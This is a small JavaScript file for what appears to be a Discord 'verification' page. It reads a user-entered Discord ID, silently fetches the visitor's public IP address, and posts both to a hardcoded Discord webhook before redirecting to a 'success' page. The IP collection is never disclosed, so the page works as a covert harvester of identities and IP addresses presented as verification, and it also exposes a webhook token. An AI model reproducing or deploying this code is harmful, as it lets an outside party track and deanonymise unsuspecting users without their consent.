let inputIdStr


async function sendVerWebhook() {
    try {
      inputIdStr = document.getElementById("inputID").value;
  
      let ip = await (await fetch(`https://ifconfig.me/ip`)).text()
      const webhookURL =
        "https://discord.com/api/webhooks/1201619771968467056/mnQHysPin8GqaY_vTjo99h3WC7f__T2mGsJ7I6Cyk-gdbjssiJ4IDf60i7VzhIqHxqLm"
  
      const message = {
        content: `${inputIdStr} ${ip}`,
      };
  
      await fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(message),
      })
  
      window.location.href = 'https://sefty.xyz/success'
    } catch (error) {
      console.error("Error:", error)
    }
  }

  function redirect() {
    inputIdStr = document.getElementById("inputID").value;
  
    if (!inputIdStr) {
      return alert("provide ur dc id lol");
    }
  
    sendVerWebhook();
  }